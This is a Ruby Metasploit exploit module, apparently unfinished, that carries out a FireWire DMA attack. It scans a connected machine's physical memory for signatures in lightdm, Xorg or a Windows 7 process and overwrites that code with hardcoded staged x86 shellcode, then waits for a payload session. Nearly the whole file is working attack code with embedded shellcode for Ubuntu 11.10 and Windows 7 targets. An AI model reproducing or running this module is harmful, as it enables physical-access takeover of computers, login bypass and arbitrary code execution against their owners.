require 'msf/core'
require '~/.msf4/external/forensic1394/bus.rb'

class Metasploit3 < Msf::Exploit::Local
    # Rank = ExcellentRanking
	def initialize(info = {})
        linuxStager=
"\xe8\x00\x00\x00\x00\x60\x31\xc0\xb0\xc0\x31\xdb\x31\xc9\xb5\x80\x99\xb2\x07\xbe\x22\x00\x00\x00\xcd\x80\xd1\xe9\x01\xc8\x66\xc7\x00\xff\xe0\xff\xe0"
        winStager=
"\xe8\x00\x00\x00\x00\x60\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\xbe\x78\x56\x34\x12\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x66\xc7\x00\xff\xe0\xff\xe0" 
        winStage2 = { 'Patch' =>
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x50\x50\x50\x8d\x9d\xa5\x00\x00\x00\x53\x50\x50\x68\x38\x68\x0d\x16\xff\xd5\x61\x83\x2c\x24\x05\xc3\x58",
            'Signature' => "\xff\xe0",
            'Offset' => 0,
            'Payload' => true,
            'Wait' => true,
        }

        linuxStage2 = { 'Patch' =>
"\x89\xc1\x31\xc0\x40\x40\xcd\x80\x85\xc0\x74\x06\x61\x83\x2c\x24\x05\xc3\x89\xcc\x81\xec\x00\x08\x00\x00",
            'Signature' => "\xff\xe0\x00\x00\x00\x00\x00\x00",
            'Offset' => 0,
            'Payload' => true,
            'Wait' => true,
        }
        debugStage2 = { 'Patch' =>
                "",
            'Signature' => "\x90\x90\x90\x90\x90\x90\x90\x90",
            'Offset' => 0,
            'Payload' => true,
            'Wait' => false,
        }
		super(update_info(info,
            # TODO: fix before deployment
			'Name'           => 'farm <= 11.10 Firewire DMA attack to overwrite lightdm code',
			'Description'    => %q{
                Firewire lightdm attack.
          	},
			'Author'         => [ 'albert', 'Mr.Breaker' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 0.12 $',
			'References'     =>
				[
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 296,
                    'Encoder'     => 'generic/none'
				},
			'Targets'	=>
				[
					[ 'Windows 7 32bit sp1', 
                        {
                        'Platform' => 'windows',
                        'Arch' => ARCH_X86,
                        'Stages' => [ { 
                            'Offset' => 0x312,
                            'Signature' =>"\x55\x57\x56\x53\x83\xEC\x5C\x8B\x44\x24\x70\xE8\x47\xDC\xFA\xFF",
                            'Space' => 2048,
                            'Payload' => false,
                            'Patch' => winStager,
                            }, winStage2 ] }
                    ],
					[ 'ubuntu 11.10 libpixmap', 
                        { 
                        'Arch' => ARCH_X86,
                        'Platform' => 'linux',
                        'Stages' => [ { 
                            'Offset' => 0x480, 
                            'Signature' =>"\x55\x57\x56\x53\x83\xEC\x5C\x8B",
                            'Patch' => linuxStager,
                            'Space' => 2048,
                            'Payload'=> false,
                            }, linuxStage2 ] }
                    ],
					[ 'ubuntu 11.10 Xorg', 
                        { 
                        'Arch' => ARCH_X86,
                        'Platform' => 'linux',
                        'Stages' => [ { 
                            'Offset' => 0xFA7, 
                            'Signature'=>"\x0F\x8E\xC8\x02\x00\x00\x8B\x8B\x08\xFF\xFF\xFF\x8B\x41\x04\x8B",
                            'Patch' => linuxStager,
                            'Space' => 2048,
                            'Payload'=> false,
                            }, linuxStage2 ] }
                    ],
					[ 'ubuntu 11.10 lightdm', 
                        { 
                        'Arch' => ARCH_X86,
                        'Platform' => 'linux',
                        'Stages' => [ { 
                            'Offset' => 0x590, 
                            'Signature' => "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24",
                            'Patch' => linuxStager,
                            'Space' => 2048,
                            'Payload'=> false,
                            }, linuxStage2 ] }
                    ],
					[ 'Ubuntu 11.10 direct', 
                        { 
                        'Arch' => ARCH_X86,
                        'Platform' => 'linux',
                        'Stages' => [ { 
                            'Offset' => 0x590, 
                            'Signature' => "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24",
                            'Space' => 2048,
                            'Payload'=> true,
                            'Patch' => "",
                            }] }
                    ],
					[ 'Windows 7 x86 sp1 DIRECT', 
                        { 
                        'Arch' => ARCH_X86,
                        'Platform' => 'windows',
                        'Stages' => [ { 
                            'Offset' => 0x312, 
                            'Signature' =>"\x83\xf8\x10\x0f\x85\x50\x94\x00\x00\xb0\x01\x8b",
                            'Space' => 2048,
                            'Payload'=> true,
                            'Patch' => "",
                            }] }
                    ],
					[ 'eek the cat', { 
                        'Stages' => [ linuxStage2 ] }
                    ],
					[ 'debug', { 
                        'Stages' => [ debugStage2 ] }
                    ],
				],
			'DefaultTarget'	=> 0,
        	'DisclosureDate' => 'Long long ago', 
        ))
        register_options(
			[
			], self.class)

		register_advanced_options(
			[
			], self.class)
	end

	def exploit
        # Initialize
        b = Bus.new
        d = initialize_fw(b)
         
        ##
        # Loop through all stages
        ##
        oldmem = false
        for stage in target['Stages']
            if (stage['Wait'])
                puts 'Press enter if the current stage is run'
                gets
            end

            # Write memory of previous stage
            d.write(oldmem[0],oldmem[1]) if oldmem

            puts 'Searching for payload page'
            patch = stage['Patch']
            patch += payload.encoded if stage['Payload']
            oldmem = patchPage(d, stage['Signature'],patch,stage['Offset'])
        end

        ##
        # Stage 3: wait for the session to be created
        ##
		print_status "Starting the payload handler..."
		while(!session_created?)
			select(nil,nil,nil,1)
		end

        b.delete
 	end

    def initialize_fw(b)
        # Enable SBP-2 support to ensure we get DMA
        b.enable_sbp2()

        for i in 2.downto(1)
            puts "[*] Initializing bus and enabling SBP2, please wait %2d seconds" % i
            STDOUT.flush
            sleep(1)
        end

        # Open the first device
        d = b.devices
        raise 'nothing connected' if d.length <= 0

        d[0].open()

        return d[0]
    end 

    # Tries to find signature on a page at offset at device d 
    def patchPage(d,sig,patch,off)
        # Print phase, method and patch parameters
        puts '        Using signature: %s' % bin2hex(sig)
        puts '        Using patch:     %s' % bin2hex(patch)
        puts '        Using offset:    %x' % off

        # Find memory size
        memsize = 4 * 1024 * 1024  * 1024

        begin        
            addr = findsig(d, sig, off, memsize)
            raise 'Signature not found.'  if !addr

            puts 'Signature found at 0x%x.' % addr
            oldmem = d.read(addr, patch.length) # save patched data
            d.write(addr, patch)
            raise 'Patch NOT confirmed!' if d.read(addr, patch.length) != patch

            return [addr,oldmem]
        rescue IOError => e
            raise e.message + ' Make sure FireWire interfaces are properly connected.'
        end
    end

    def findsig(d, sig, off, memsize)
        pagesize = 4096 
        # Skip the first 1 MiB of memory
        one_mb = 1024 * 1024 * 1
        
        for addr in (one_mb + off..memsize).step(pagesize)
            return addr if sig == d.read(addr, sig.length)
        end
    end          

    def bin2hex(s)
        return s.unpack('C*').map{ |b| "%02X" % b }.join('')
    end
end
